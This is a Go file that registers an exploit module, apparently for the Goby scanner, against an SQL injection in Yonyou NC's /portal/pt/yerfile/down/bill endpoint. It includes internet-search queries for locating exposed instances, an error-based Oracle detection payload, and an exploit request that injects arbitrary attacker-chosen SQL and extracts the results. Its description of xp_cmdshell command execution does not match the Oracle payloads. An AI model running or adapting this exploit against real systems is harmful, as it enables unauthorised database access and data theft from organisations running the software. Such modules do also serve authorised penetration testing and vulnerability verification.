package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Yonyou NC /portal/pt/yerfile/down SQL Injection Vulnerability",
    "Description": "<p>Yonyou NC is an enterprise-level management software primarily designed for large enterprises and group companies. This vulnerability exists in the portal/pt/yerfile/down interface of Yonyou NC, allowing attackers to exploit the SQL injection vulnerability in conjunction with the database's xp_cmdshell function to execute arbitrary commands and take control of the server. This vulnerability is easy to exploit and may lead to severe consequences such as sensitive data leakage and complete system compromise.</p>",
    "Product": "Yonyou NC",
    "Homepage": "https://www.yonyou.com",
    "DisclosureDate": "2024-12-04",
    "PostTime": "2024-12-09",
    "Author": "heqiming@baimaohui.net",
    "FofaQuery": "(body=\"UFIDA\" && body=\"logo/images/\") || (body=\"logo/images/ufida_nc.png\") || title=\"Yonyou NC\" || body=\"<div id=\\\\\\\"nc_text\\\\\\\">\" || body=\"<div id=\\\\\\\"nc_img\\\\\\\" onmouseover=\\\\\\\"overImage('nc');\" || (title==\"产品登录界面\" && body=\"UFIDA NC\")",
    "GobyQuery": "(body=\"UFIDA\" && body=\"logo/images/\") || (body=\"logo/images/ufida_nc.png\") || title=\"Yonyou NC\" || body=\"<div id=\\\\\\\"nc_text\\\\\\\">\" || body=\"<div id=\\\\\\\"nc_img\\\\\\\" onmouseover=\\\\\\\"overImage('nc');\" || (title==\"产品登录界面\" && body=\"UFIDA NC\")",
    "Level": "2",
    "Impact": "<p>This vulnerability allows attackers to execute arbitrary commands through SQL injection, potentially leading to complete server control, sensitive data leakage, and business disruption.</p>",
    "Recommendation": "<p>It is recommended to immediately apply the official patch and restart the service to take effect. Additionally, ensure strict parameterization of SQL queries to prevent SQL injection attacks. Limit the use of high-risk database functions (such as xp_cmdshell) and strengthen access control to the interface.</p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/144252044"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "SELECT name FROM v$database,SELECT * FROM v$version WHERE rownum = 1,SELECT USER FROM dual",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "SELECT name FROM v$database",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/portal/pt/yerfile/down/bill?pageId=login",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "id=1' AND 9751=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(111)||CHR(87)||CHR(53)||CHR(113)||CHR(66)||CHR(49)||CHR(119)||CHR(73)||CHR(51)||CHR(97)||CHR(77)||CHR(53)||CHR(111)||CHR(85)||CHR(57)||CHR(98)||CHR(73)||CHR(49)||CHR(97)||CHR(71)||CHR(50)||CHR(99)||CHR(68)||CHR(52)||CHR(105)||CHR(83)||CHR(49)||CHR(103)||CHR(72)||CHR(56)||CHR(112)||CHR(72)||CHR(62))) FROM DUAL)-- mcuO"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "oW5qB1wI3aM5oU9bI1aG2cD4iS1gH8pH",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/portal/pt/yerfile/down/bill?pageId=login",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
                    "Accept": "*/*",
                    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "id=1' AND (select dbms_xdb_version.makeversioned(({{{payload}}})) from dual) is not null -- mcuO"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex| \"([^'][\\s\\S]*?)\" ",
                "output|when|attackType=sqlpoint|{{{lastreq}}}id=1*"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.3",
    "Translation": {
        "CN": {
            "Name": "用友NC /portal/pt/yerfile/down/bill SQL 注入漏洞",
            "Product": "用友NC",
            "Description": "<p>用友NC（也称用友NC6或NCC）是用友网络科技股份有限公司开发的一款企业级管理软件，旨在为企业提供全方位的管理服务。主要面向大型企业和集团公司，提供全面的财务和业务管理解决方案，助力企业实现数字化转型和高效管理。采用J2EE架构和先进开放的集团级开发平台UAP，融合了云计算技术、移动应用技术等最新互联网技术，形成了集团管控8大领域15大行业68个细分行业的解决方案。凭借其全面的功能、强大的集成能力和高度的可定制化，成为许多大型企业和集团公司进行财务和业务管理的首选工具。<br></p>",
            "Recommendation": "<p>目前官方已发布漏洞修复版本，建议用户升级到安全版本：<a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a><br></p>",
            "Impact": "<p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Yonyou NC /portal/pt/yerfile/down SQL Injection Vulnerability",
            "Product": "Yonyou NC",
            "Description": "<p>Yonyou NC is an enterprise-level management software primarily designed for large enterprises and group companies. This vulnerability exists in the portal/pt/yerfile/down interface of Yonyou NC, allowing attackers to exploit the SQL injection vulnerability in conjunction with the database's xp_cmdshell function to execute arbitrary commands and take control of the server. This vulnerability is easy to exploit and may lead to severe consequences such as sensitive data leakage and complete system compromise.</p>",
            "Recommendation": "<p>It is recommended to immediately apply the official patch and restart the service to take effect. Additionally, ensure strict parameterization of SQL queries to prevent SQL injection attacks. Limit the use of high-risk database functions (such as xp_cmdshell) and strengthen access control to the interface.</p>",
            "Impact": "<p>This vulnerability allows attackers to execute arbitrary commands through SQL injection, potentially leading to complete server control, sensitive data leakage, and business disruption.</p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "payload": "switch|attackType|{{{default}}}",
        "vulurl": "define|variable|{{{fixedhostinfo}}}/portal/pt/yerfile/down/bill"
    },
    "VariablesOrder": [
        "payload",
        "vulurl"
    ],
    "EditType": "fast",
    "PocId": "9977"
}`
  
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}